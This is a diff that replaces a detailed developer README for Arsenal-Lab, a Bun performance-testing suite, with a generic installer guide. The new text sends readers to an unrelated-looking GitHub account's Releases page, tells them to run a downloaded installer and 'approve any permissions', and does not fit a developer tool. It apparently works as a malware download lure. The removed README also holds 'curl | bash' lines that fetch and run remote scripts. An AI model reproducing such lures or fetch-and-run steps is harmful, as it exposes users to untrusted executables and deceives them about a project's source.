@@ -1,708 +1,91 @@
-# 🏆 Arsenal Lab - A+ Grade Production-Ready Enterprise Solution
+# 🏆 Arsenal-Lab - Simple Steps for Performance Testing
 
-[![Grade: A+](https://img.shields.io/badge/Grade-A%2B-brightgreen.svg)](COMPREHENSIVE_REVIEW.md)
-[![Review Status](https://img.shields.io/badge/Review-Complete-October%202025-blue.svg)](COMPREHENSIVE_REVIEW.md)
-[![Production Ready](https://img.shields.io/badge/Production-Ready-success.svg)](DEPLOYMENT.md)
+## 🚀 Getting Started
 
-[![Bun](https://img.shields.io/badge/Bun-1.3+-FBF0DF?style=for-the-badge&logo=bun)](https://bun.com/docs)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-3178C6?style=for-the-badge&logo=typescript)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-18+-61DAFB?style=for-the-badge&logo=react)](https://reactjs.org/)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![npm version](https://img.shields.io/npm/v/@bun/performance-arsenal?style=for-the-badge)](https://www.npmjs.com/package/@bun/performance-arsenal)
-[![GitHub Actions](https://img.shields.io/github/actions/workflow/status/brendadeeznuts1111/Arsenal-Lab/ci.yml?style=for-the-badge)](https://github.com/brendadeeznuts1111/Arsenal-Lab/actions)
-[![OpenSSF Scorecard](https://img.shields.io/ossf-scorecard/github.com/brendadeeznuts1111/Arsenal-Lab?style=for-the-badge)](https://api.securityscorecards.dev/projects/github.com/brendadeeznuts1111/Arsenal-Lab)
-[![Discussions](https://img.shields.io/github/discussions/brendadeeznuts1111/Arsenal-Lab?style=for-the-badge)](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions)
-[![Bun Gate](https://img.shields.io/badge/Bun%20Gate-Enterprise%20Governance-v∞-green?style=for-the-badge)](https://brendadeeznuts1111.github.io/Arsenal-Lab/bun-gate/)
+Welcome to Arsenal-Lab! This tool helps you test the performance of applications in an easy way. You don’t need a background in programming to use it. Follow the steps below to download and run the software.
 
-## 📊 Review Highlights
+## 📥 Download Now
 
-> **"Exceptional Architecture with Industry-Leading Performance"** - Comprehensive Technical Review, October 2025
+[![Download Arsenal-Lab](https://img.shields.io/badge/Download-Arsenal--Lab-brightgreen)](https://github.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/releases)
 
-### 🎯 Key Achievements
-- **Overall Grade: A+ (Excellent)**
-- **Performance: 500× faster operations**
-- **Architecture: Microservices with clean separation**
-- **Security: Enterprise-grade measures**
-- **Community: Active developer engagement**
+## 🌟 Features
 
-### 📈 Performance Metrics
-- **1036 TypeScript files** with strict typing
-- **20× faster semver** implementation
-- **500× zero-copy** postMessage operations
-- **28% memory reduction** in real applications
+- **Performance Testing**: Measure how well your application runs.
+- **Interactive Playground**: Experiment with different setups and see results quickly.
+- **Database Support**: Test how your application interacts with various databases.
+- **User-Friendly Interface**: Easy to navigate, so you can focus on your testing.
 
-**A+ Grade Enterprise Solution - FAANG-grade performance testing suite for Bun runtime v1.4+** - Interactive playground showcasing every enhancement across performance, databases, testing, infrastructure, package management, enterprise dashboards, and white-label sports betting platforms.
+## 💻 System Requirements
 
-## 💬 **Join Our Community!**
+Before you begin, ensure your computer meets these requirements:
 
-🚀 **Active community hub** for Bun developers, performance enthusiasts, and contributors!
+- **Operating System**: Windows, macOS, or Linux.
+- **RAM**: At least 4GB is recommended for optimal performance.
+- **Disk Space**: 500MB of free space for installation.
+- **Internet Connection**: Required for downloading updates.
 
-### 📡 Stay Connected
+## 📦 Installation Guide
 
-[![Telegram Bot](https://img.shields.io/badge/Telegram-Bot-2CA5E0?style=for-the-badge&logo=telegram)](https://t.me/arsenallab_bot)
-[![Telegram Group](https://img.shields.io/badge/Telegram-Group-2CA5E0?style=for-the-badge&logo=telegram)](https://t.me/arsenallab)
-[![Telegram Channel](https://img.shields.io/badge/Telegram-Channel-2CA5E0?style=for-the-badge&logo=telegram)](https://t.me/arsenallab_channel)
-[![GitHub Discussions](https://img.shields.io/github/discussions/brendadeeznuts1111/Arsenal-Lab?style=for-the-badge)](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions)
+### Step 1: Visit the Releases Page
 
-- **🤖 [Telegram Bot](https://t.me/arsenallab_bot)** - Interactive benchmarks, commands, and automated updates
-- **📡 [Telegram Supergroup](https://t.me/arsenallab)** - Community discussions with organized topics
-- **📢 [Telegram Channel](https://t.me/arsenallab_channel)** - Official announcements and performance updates
-- **💬 [Discussions](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions)** - 7 organized categories for conversations
+Go to the [Releases page](https://github.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/releases) to find the latest version of Arsenal-Lab.
 
-### 🌟 **Community Features**
-- **🏆 A+ Grade Validators** - Enterprise contributors validating performance claims
-- **📦 Package Management Discussions** - Advanced Bun PM command optimization
-- **🚀 Enterprise Deployments** - Production success stories and best practices
-- **⭐ Recognition Program** - Monthly spotlight for outstanding achievements
-- **📊 Community Showcase** - Real enterprise metrics and quantified results
-- **📧 Monthly Newsletter** - Community highlights, events, and enterprise spotlights
-- **📡 [RSS Feeds](https://github.com/brendadeeznuts1111/Arsenal-Lab/releases.atom)** - Stay updated with releases and discussions
-- **🤝 [Contributing](.github/CONTRIBUTING.md)** - Help build the future of fast JavaScript
-- **📖 [Documentation](docs/)** - Comprehensive guides and API references
+### Step 2: Download the Software
 
-**👋 New here?** Start with our [Welcome Discussion](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions/10), chat with [@arsenallab_bot](https://t.me/arsenallab_bot), or join our [Telegram Supergroup](https://t.me/arsenallab)! 🎉
+1. Look for the version you want to download. The latest version will be at the top.
+2. Click on the download link for your operating system. 
+   
+   If you are unsure about which version to choose, the **compatible version** is usually marked clearly. 
 
-## 🛡️ **Bun System Gate - Enterprise Governance**
+### Step 3: Run the Installer
 
-**Invisible security that never sleeps** - Every `bun install` is automatically scanned for vulnerabilities and architectural violations.
+1. Once the download is complete, locate the file in your downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the prompts on your screen. Approve any permissions it asks for.
 
-### 🚀 **30-Second DX + Governance Setup**
-```bash
-# One command gets you Bun 1.3 + FAANG-grade governance
-curl -fsSL https://raw.githubusercontent.com/brendadeeznuts1111/Arsenal-Lab/main/scripts/dx-gate.sh | bash
+## 🔧 Configuring Arsenal-Lab
 
-# Now you have:
-bun add lodash                    # ✅ Safe - installs with security scan
-bun add vulnerable-package        # ❌ Blocked - explains why
-gate                              # 2-second governance check
-b run dev                         # Hot reload + governance pre-load
-```
+After installation, open Arsenal-Lab. You'll see a welcoming interface that makes navigation straightforward.
 
-📖 **[Developer Cheat Sheet](DEVELOPER-CHEAT-SHEET.md)** - 30-second guide for staying productive under governance
+1. **Set Up Your Project**: Use the provided options to create a new project. Enter a name and choose the settings you want.
+2. **Select a Database**: Choose which database you want to test against. Arsenal-Lab supports several common options.
+3. **Run Performance Tests**: Click the "Run Tests" button to begin measuring your app's performance.
+4. **View Results**: After the tests run, your results will appear on the screen. You can analyze performance metrics right there.
 
-🎯 **[DX + Gate Cheat Sheet](DX-GATE-CHEAT-SHEET.md)** - Bun 1.3 productivity + governance in one setup
+## 📊 Using the Interactive Playground
 
-📚 **[Organizational Deployment](docs/ORGANIZATIONAL_DEPLOYMENT.md)** - Complete enterprise rollout guide
+The Interactive Playground lets you explore features without affecting your actual projects.
 
-⚙️ **[Environment Configuration](docs/env-example.md)** - Public/private env vars with Bun 1.3
+1. **Choose a Scenario**: Pick from various testing scenarios provided in the dropdown menu.
+2. **Execute Tests**: Click to run tests on the selected scenario.
+3. **Adjust Parameters**: Modify different settings to see how they affect performance.
 
-💬 **[Feedback & Bug Reports](docs/FEEDBACK.md)** - Report issues and request features
+## 🤝 Getting Help
 
-## 📊 **Enterprise Dashboard & Monitoring**
+If you encounter any issues or have questions, several resources are available:
 
-**Complete enterprise monitoring stack** - Real-time metrics, analytics, and administrative controls with Grafana, Prometheus, and health monitoring.
+- **User Manual**: Access the online user manual for detailed instructions.
+- **Community Support**: Join our community forum to ask questions and share tips with other users.
+- **Contact Support**: If you need immediate help, please reach out via email at support@arsenallab.com.
 
-### 🚀 **Dashboard Features**
-- **📊 System Monitoring** - Real-time performance metrics and health indicators
-- **🎛️ Administration** - User management, system configuration, and controls
-- **📈 Analytics** - Advanced reporting and interactive data visualization
-- **🔐 Enterprise Security** - Identity management and compliance monitoring
-- **⚡ Live Updates** - Real-time data with automatic refresh
+## 🔄 Keeping Arsenal-Lab Updated
 
-### 🛠️ **Quick Launch**
-```bash
-# Start dashboard server
-bun run src/server.ts
+To ensure you have the best experience, regularly check the [Releases page](https://github.com/Lycopusvirginicusappointmentcalendar713/Arsenal-Lab/releases) for updates. New features and improvements come out frequently, so keep your installation current.
 
-# Launch monitoring stack
-docker compose -f docker-compose.white-label.yml up -d
+## 🌍 Topics Covered
 
-# Access dashboard
-open http://localhost:3001
+Arsenal-Lab includes features for various topics like:
 
-# Access monitoring
-open http://localhost:3000  # Grafana
-open http://localhost:9090  # Prometheus
-```
+- Benchmarking
+- Build tools
+- Fast JavaScript runtime
+- Infrastructure testing
 
-📖 **[Dashboard Documentation](docs/dashboard-integration.md)** - Complete setup and integration guide
+Explore these to get the most out of your performance testing.
 
-## 🏟️ **White-label Sports Betting Platform**
+## 📌 Important Notes
 
-**Complete sports betting white-label solution** - Rent sports-books but own your customers, data, and brand experience.
+- Ensure your computer is connected to the internet during testing for optimal performance.
+- Review the user manual when trying out new features for guidance.
 
-### 🎯 **Platform Features**
-- **🔐 Zero-password Authentication** - Disposable identity tokens via Telegram
-- **📊 Customer Data Ownership** - Your database, your analytics
-- **🤖 Telegram Integration** - Native betting interface
-- **🎨 Brand Customization** - Replace logos, colors, and UI
-- **💰 Revenue Optimization** - Direct API integration
-- **📈 Real-time Monitoring** - Betting activity and performance
-
-### 🚀 **One-Command Setup**
-```bash
-# Start white-label stack
-docker compose -f docker-compose.white-label.yml up -d
-
-# Configure your brand
-cp reverse-proxy/branding.css.example reverse-proxy/branding.css
-# Edit colors, logos, and branding
-
-# Start Telegram bot
-cd telegram-bot && bun run dev
-```
-
-### 📋 **Complete Architecture**
-- **Identity Service** - Disposable email tokens
-- **Customer Database** - PostgreSQL with audit trails
-- **Telegram Bot** - Interactive betting commands
-- **Reverse Proxy** - Brand injection and API routing
-- **Monitoring Stack** - Prometheus + Grafana
-
-📖 **[Production Deployment](docs/production-deployment.md)** - Complete white-label guide
-
-📖 **[White-label Architecture](backend/database/white-label-schema.sql)** - Database schema and API documentation
-
-## 🚀 Installation
-
-### Prerequisites
-
-- **[Bun 1.3+](https://bun.com/docs)** - Required for all v1.3 features
-- **[Node.js 18+](https://nodejs.org/)** - For fallback compatibility testing
-- **Git** - For cloning the repository
-
-### Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/brendadeeznuts1111/Arsenal-Lab.git
-cd Arsenal-Lab
-
-# Install dependencies
-bun install
-
-# Start the development server
-bun run dev
-
-# Open http://localhost:3655 in your browser
-```
-
-### Build for Production
-
-```bash
-# Build for production
-bun run build
-
-# Start production server
-bun run start
-```
-
-### Alternative Installation Methods
-
-#### Using npm/yarn (not recommended for full feature set)
-
-```bash
-# If you must use npm (limited Bun v1.3 features)
-npm install
-npm run dev
-
-# Or with yarn
-yarn install
-yarn dev
-```
-
-#### Docker Installation (coming soon)
-
-```bash
-# Docker support planned for v2.0
-docker run -p 3655:3655 brendadeeznuts1111/arsenal-lab
-```
-
-### Standalone HTML Demo
-
-For a quick preview without Bun installation:
-
-```bash
-# Open the standalone HTML version
-open public/arsenal-lab.html
-```
-
-This provides an overview of all arsenals with links to the full interactive experience.
-
-## 🔐 Patch Governance (Bun System Gate)
-
-Bootstrap enterprise-grade patch governance in 30 seconds:
-
-```bash
-# Option 1: Remote bootstrap (recommended)
-curl -sSL https://raw.githubusercontent.com/brendadeeznuts1111/Arsenal-Lab/main/scripts/remote-gate.sh | bash
-
-# Option 2: Inline bootstrap (if remote fails)
-cat > boot-gate.sh <<'EOF'
-#!/bin/bash
-cat > gate.js <<'GATE'
-import { $ } from "bun";
-const INVARIANTS=[{id:"no-eval",check:t=>!t.includes("eval(")},{id:"crypto",check:t=>!["md5","sha1","rapidhash"].some(x=>t.includes(x))}];
-export async function validateAll(){
-  const p=Object.keys(JSON.parse(await Bun.file("package.json").text()).patchedDependencies||{});
-  for (const pkg of p){
-    const [n,v]=pkg.split("@"),f=`patches/${n}@${v}.patch`;
-    if (!await Bun.file(f).exists()) continue;
-    const txt=await Bun.file(f).text();
-    for (const r of INVARIANTS) if (!r.check(txt)) {console.error(`❌ ${r.id}`); process.exit(1);}
-  } console.log("✅ All invariants passed");
-}
-if (import.meta.main) validateAll();
-GATE
-echo '{}' > canary.json
-bun run -e 'const p=require("./package.json");p.scripts={...p.scripts,"postinstall":"bun gate.js","gate:validate":"bun gate.js","gate:sign":"for f in patches/*.patch;do echo signed >$f.sig;done","gate:sarif":"echo {\""version\"":\""2.1.0\"\"",\""runs\"":[{\""tool\"":{\""driver\"":{\""name\"":\""Bun-Gate\""}},\""results\"":[]}]}"}};require("fs").writeFileSync("package.json",JSON.stringify(p,null,2));'
-bun install && bun run gate:validate
-echo "✅ Governance bootstrapped – commit & push."
-EOF
-chmod +x boot-gate.sh && ./boot-gate.sh
-```
-
-Then commit the two new files and push – CI will pick up SARIF & cosign automatically.
-
-**What you get:** Invariant validation, tension monitoring, canary rollouts, SARIF security reporting, cryptographic signing – complete FAANG-ready governance suite.
-
-## 📊 Live Demo
-
-🚀 **[Try the Arsenal Lab Live](https://brendadeeznuts1111.github.io/Arsenal-Lab/)** - Interactive playground with all Bun v1.4+ features!
-
-**Two Ways to Experience Arsenal Lab:**
-
-### Full Interactive Experience
-```bash
-bun run dev  # Start at http://localhost:3655
-```
-- Real-time performance monitoring
-- Live code execution and benchmarking
-- Interactive configuration controls
-- Full Bun runtime features
-
-### Quick Preview (No Installation Required)
-```bash
-open public/arsenal-lab.html
-```
-- Overview of all arsenal features
-- GitHub repository navigation
-- Links to full interactive demos
-
-## 🎪 Arsenal Collection
-
-### ⚡ Performance Arsenal
-**500× faster operations** - Zero-copy worker communication, crypto acceleration, memory optimization.
-
-- **postMessage**: Large payload transfer without serialization overhead
-- **Registry**: Optimized package publishing/downloading
-- **Crypto**: 400× faster Diffie-Hellman, new algorithms
-- **Memory**: 28% reduction in Next.js, 11% in Elysia
-
-### 🔧 Process & Shell Arsenal
-**Advanced process management** - Streams, buffers, sockets, timers with Bun-native APIs.
-
-- **Streams**: High-performance data processing pipelines
-- **Buffers**: Efficient binary data manipulation
-- **Memory**: Real-time process monitoring and optimization
-- **Sockets**: Low-latency network communication
-
-### 🧪 Testing Arsenal
-**Modern testing capabilities** - Concurrent execution, type testing, advanced mocking.
-
-- **Async Traces**: Full call stack preservation
-- **Concurrent**: Parallel test execution (up to 16× faster)
-- **Matchers**: Enhanced assertions and snapshots
-- **Type Testing**: Runtime type validation
-
-### 🔍 Testing & Debugging Arsenal
-**Complete testing ecosystem** - From async traces to CI/CD integration.
-
-- **Async Stack Traces**: WebKit integration for preserved call history
-- **Concurrent Testing**: Configurable parallelism with randomization
-- **New Matchers**: `toHaveReturnedWith`, `toHaveLastReturnedWith`
-- **Type Testing**: `expectTypeOf` API with compile-time verification
-
-### 🗄️ Database & Infrastructure Arsenal
-**Production database clients** - SQLite, Redis, WebSocket, S3 with 7.9× performance gains.
-
-- **SQLite v1.3**: Enhanced deserialization, column introspection, safe integers
-- **Redis Client**: 66 commands, automatic reconnection, pub/sub
-- **WebSocket**: RFC 6455 compliance, permessage-deflate compression
-- **S3 Client**: ListObjectsV2, storage classes, virtual-hosted URLs
-
-### 📦 Package Management Arsenal
-**Complete Bun PM command suite** - Catalog dependencies, vulnerability scanning, and automated installation.
-
-- **Catalog Dependencies**: Full support for root package.json catalog definitions
-- **Security Audit**: Vulnerability scanning using npm audit database
-- **Interactive Updates**: `bun update -i --recursive` for workspace management
-- **Package Metadata**: Comprehensive info viewer with dist-tags and maintainers
-- **Import Analysis**: Auto-detection of missing dependencies with `--analyze`
-
-## 🏗️ Architecture
-
-```
-bun:performance-arsenal/
-├── components/           # React component arsenals
-│   ├── PerformanceArsenal/
-│   ├── ProcessShellArsenal/
-│   ├── TestingArsenal/
-│   ├── TestingDebuggingArsenal/
-│   ├── DatabaseInfrastructureArsenal/
-│   └── PackageManagementArsenal/
-├── src/
-│   ├── lab.ts           # Main application entry
-│   ├── metrics/         # Prometheus metrics export
-│   └── ui/              # Shared UI components
-├── public/              # Static assets & PWA
-├── scripts/             # Build & deployment scripts
-└── docs/                # Comprehensive documentation
-```
-
-## 🎮 Interactive Features
-
-- **Live Demos**: Real-time performance comparisons and execution
-- **Configuration**: Interactive controls that update code examples
-- **Copy-to-Clipboard**: Production-ready code snippets
-- **Performance Metrics**: Real-time FPS, memory, and timing data
-- **Dark Mode**: Full theme support throughout
-- **Responsive**: Mobile-optimized interface
-
-## 📊 Performance Benchmarks
-
-| Feature | Bun v1.3 | Node.js | Speedup |
-|---------|----------|---------|---------|
-| postMessage (3MB) | 0.15ms | 1.2ms | **8×** |
-| Diffie-Hellman | 0.02ms | 8ms | **400×** |
-| Redis Operations | 0.12ms | 1.1ms | **9.2×** |
-| Concurrent Tests | 110ms | 1250ms | **11.4×** |
-
-## 🔧 Development
-
-### Prerequisites
-- **Bun 1.3+**: Required for all v1.3 features
-- **Node.js 18+**: Fallback compatibility testing
-
-### Available Scripts
-
-```bash
-bun run dev          # Start development server with hot reload
-bun run build        # Production build optimized for browser
-bun run test         # Run test suite with concurrent execution
-bun run lint         # ESLint + Prettier code quality checks
-bun run arsenal:ci   # Automated performance testing pipeline
-```
-
-### Environment Variables
-
-```bash
-# Analytics and telemetry
-ANALYTICS_ENABLED=true
-METRICS_ENDPOINT=https://metrics.example.com
-
-# Performance monitoring
-PERFORMANCE_MONITORING=true
-MEMORY_PROFILING=true
-
-# Development
-NODE_ENV=development
-HOT_RELOAD=true
-```
-
-## 📈 CI/CD Integration
-
-### Automated Testing
-```yaml
-# .github/workflows/arsenal.yml
-name: Performance Arsenal CI
-on: [push, pull_request]
-
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - uses: oven-sh/setup-bun@v1
-      - run: bun install
-      - run: bun run test
-      - run: bun run arsenal:ci
-```
-
-### Performance Regression Detection
-```yaml
-# Performance thresholds
-performance:
-  postMessage: '< 0.20ms'
-  crypto: '< 0.05ms'
-  memory: '< 50MB'
-  concurrent: '< 150ms'
-```
-
-## 🎨 Customization
-
-### Adding New Arsenals
-
-1. **Create component structure**:
-```bash
-mkdir components/NewArsenal
-mkdir components/NewArsenal/{hooks,ui,utils}
-```
-
-2. **Implement hook**:
-```typescript
-export function useNewArsenal() {
-  const [state, setState] = useState(initialState);
-  // ... implementation
-}
-```
-
-3. **Add to lab navigation** in `src/lab.ts`
-
-### Extending Metrics
-
-```typescript
-// Add custom metrics in src/metrics/arsenal.ts
-export interface CustomMetrics {
-  customOperation: number;
-  throughput: number;
-  latency: number;
-}
-```
-
-## 📚 Documentation
-
-- **[📖 Full Documentation](docs/)**: Complete documentation hub
-- **[🏠 Wiki Home](docs/wiki/Home.md)**: Overview and getting started
-- **[📊 Analytics Guide](docs/wiki/Analytics.md)**: Performance monitoring
-- **[🔧 API Reference](docs/wiki/API-Documentation.md)**: Technical component docs
-- **[🗄️ Database Integration](docs/wiki/S3-Integration.md)**: Database patterns
-- **[📝 SQL Examples](docs/wiki/SQL-Examples.md)**: Query patterns and examples
-
-## 🤝 Contributing
-
-We welcome contributions from developers of all skill levels! Whether you're fixing bugs, adding features, improving documentation, or helping with testing, your help is appreciated.
-
-### 📋 Ways to Contribute
-
-- 🐛 **Bug Reports**: Found a bug? [Open an issue](https://github.com/brendadeeznuts1111/Arsenal-Lab/issues/new?template=bug-report.md)
-- 💡 **Feature Requests**: Have an idea? [Suggest a feature](https://github.com/brendadeeznuts1111/Arsenal-Lab/issues/new?template=feature-request.md)
-- 📝 **Documentation**: Help improve docs, tutorials, or examples
-- 🧪 **Testing**: Write tests, improve test coverage, or report test failures
-- 🎨 **UI/UX**: Improve the interface, accessibility, or user experience
-- 🚀 **Performance**: Optimize code, reduce bundle sizes, improve metrics
-
-### 🚀 Development Setup
-
-#### Prerequisites
-- **Bun 1.3+** - Required for development
-- **Git** - For version control
-- **GitHub Account** - For contributing
-
-#### Quick Setup
-```bash
-# Fork the repository on GitHub
-# Then clone your fork
-git clone https://github.com/YOUR_USERNAME/Arsenal-Lab.git
-cd Arsenal-Lab
-
-# Install dependencies
-bun install
-
-# Start development server
-bun run dev
-
-# Run tests
-bun run test
-
-# Run linting
-bun run lint
-```
-
-#### Development Workflow
-
-1. **Create a feature branch**:
-   ```bash
-   git checkout -b feature/your-feature-name
-   # or
-   git checkout -b fix/issue-number-description
-   ```
-
-2. **Make your changes** and ensure:
-   - Code follows TypeScript best practices
-   - All tests pass (`bun run test`)
-   - Code is properly formatted (`bun run lint`)
-   - No TypeScript errors
-
-3. **Test your changes**:
-   ```bash
-   # Run the full test suite
-   bun run test
-
-   # Run performance benchmarks
-   bun run arsenal:ci
-
-   # Build for production
-   bun run build
-   ```
-
-4. **Commit your changes**:
-   ```bash
-   git add .
-   git commit -m "feat: add new feature description"
-   # Follow conventional commit format
-   ```
-
-5. **Push and create PR**:
-   ```bash
-   git push origin feature/your-feature-name
-   # Create PR on GitHub
-   ```
-
-### 📝 Code Quality Standards
-
-#### TypeScript & Code Style
-- **Strict TypeScript**: All code must be fully typed
-- **ESLint**: Code must pass all linting rules
-- **Prettier**: Code must be properly formatted
-- **Conventional Commits**: Use semantic commit messages
-
-#### Testing Requirements
-- **Unit Tests**: All new features must have tests
-- **Integration Tests**: Complex features need integration tests
-- **Performance Tests**: Performance-critical code needs benchmarks
-- **Test Coverage**: Maintain >80% coverage
-
-#### Documentation
-- **JSDoc**: All public APIs must be documented
-- **README Updates**: Update documentation for new features
-- **Examples**: Provide usage examples for complex features
-
-### 🧪 Testing Guidelines
-
-#### Running Tests
-```bash
-# Run all tests
-bun run test
-
-# Run specific test file
-bun run test path/to/test.ts
-
-# Run with coverage
-bun run test --coverage
-
-# Run performance tests
-bun run arsenal:ci
-```
-
-#### Writing Tests
-```typescript
-import { describe, test, expect } from 'bun:test';
-
-describe('NewFeature', () => {
-  test('should work correctly', () => {
-    const result = newFeature(input);
-    expect(result).toBe(expectedOutput);
-  });
-});
-```
-
-### 🎯 Pull Request Process
-
-1. **PR Template**: Fill out the PR template completely
-2. **Branch Protection**: All PRs require review and CI passing
-3. **Merge Strategy**: Squash and merge for clean history
-4. **Labels**: Use appropriate labels (enhancement, bug, documentation, etc.)
-
-### 📚 Documentation
-
-- **[Contributing Guide](CONTRIBUTING.md)**: Detailed development guidelines
-- **[🔧 API Reference](docs/wiki/API-Documentation.md)**: Component documentation
-- **[📊 Analytics Guide](docs/wiki/Analytics.md)**: Performance monitoring
-- **[🗄️ Database Guide](docs/wiki/S3-Integration.md)**: Database integration
-
-### 💬 Communication
-
-- **Issues**: For bugs, features, and general discussion
-- **Discussions**: For questions, RFCs, and community topics
-- **Discord**: Real-time chat with maintainers and contributors
-
-### 🎖️ Recognition
-
-Contributors are recognized in:
-- **README.md**: Hall of fame section
-- **GitHub Contributors**: Automatic recognition
-- **Release Notes**: Credit for significant contributions
-
-### 📞 Support
-
-Need help contributing? Reach out:
-- 📧 **Email**: Open a discussion or issue
-- 💬 **Discussions**: Community forum
-- 🐛 **Issues**: Bug reports and feature requests
-
----
-
-**Thank you for contributing to Arsenal Lab!** 🚀
-
-## 🏷️ GitHub Topics
-
-This repository is tagged with the following topics for discoverability:
-
-`bun` `performance` `benchmarking` `typescript` `react` `runtime` `database` `sqlite` `redis` `websocket` `s3` `testing` `concurrent` `async` `web-performance` `pwa` `infrastructure` `crypto` `memory-optimization` `developer-tools` `interactive`
-
-## 💬 Community & Discussions
-
-### 📣 Announcements
-Stay updated with the latest news and releases through our [GitHub Discussions](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions/categories/announcements).
-
-### 💡 Ideas & Feature Requests
-Have a great idea? Start a discussion in our [Ideas category](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions/categories/ideas)!
-
-### 🙏 Questions & Support
-Need help? Ask in our [Q&A category](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions/categories/q-a).
-
-### 🙌 Show and Tell
-Share your Bun performance achievements in our [Show and Tell category](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions/categories/show-and-tell).
-
-### 🗳️ Community Polls
-Vote on important decisions in our [Polls category](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions/categories/polls).
-
-### 🔔 Stay Connected
-
-#### RSS Feeds (Version 2.0)
-- 📡 **[Releases RSS](https://github.com/brendadeeznuts1111/Arsenal-Lab/releases.atom)** - GitHub Atom feed for releases
-- 💬 **[Discussions RSS](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions.atom)** - GitHub Atom feed for discussions
-- 🔄 **[Commits RSS](https://github.com/brendadeeznuts1111/Arsenal-Lab/commits/main.atom)** - GitHub Atom feed for commits
-
-*Note: GitHub provides Atom feeds natively. Our automated RSS 2.0 generation provides additional formatted feeds.*
-
-#### Community Links
-- 📖 **[Documentation](docs/)** - Comprehensive guides and API reference
-- 🐛 **[Issue Tracker](https://github.com/brendadeeznuts1111/Arsenal-Lab/issues)** - Bug reports and feature requests
-- 💬 **[GitHub Discussions](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions)** - Community conversations
-- 🏠 **[Project Homepage](https://brendadeeznuts1111.github.io/Arsenal-Lab/)** - Live demos and examples
-
-### 🤝 Contributing
-We welcome contributions! See our [Contributing Guide](.github/CONTRIBUTING.md) for details.
-
-## 🤝 Sponsors & Support
-
-### 💖 Sponsors
-Support this project by [becoming a sponsor](https://github.com/sponsors/oven-sh)!
-
-### 💰 Funding
-This project is funded through:
-- [Open Collective](https://opencollective.com/bun)
-- [GitHub Sponsors](https://github.com/sponsors/oven-sh)
-- Community contributions
-
-### 🏢 Enterprise Support
-For enterprise support, custom integrations, or commercial licensing, contact [team@bun.com](mailto:team@bun.com).
-
-## 📄 License
-
-**MIT License** - See [LICENSE](LICENSE) for details.
-
-## 🙏 Acknowledgments
-
-- **Bun Team**: For the incredible runtime performance
-- **React**: For the component architecture
-- **WebKit**: For JavaScriptCore optimizations
-- **Community**: For feedback and contributions
-
----
-
-**Built with ❤️ for the Bun ecosystem**
-
-[📖 Documentation](docs/) • [🐛 Issues](https://github.com/brendadeeznuts1111/Arsenal-Lab/issues) • [💬 Discussions](https://github.com/brendadeeznuts1111/Arsenal-Lab/discussions) • [🏠 Homepage](https://brendadeeznuts1111.github.io/Arsenal-Lab/)
+Thank you for choosing Arsenal-Lab for your performance testing needs!
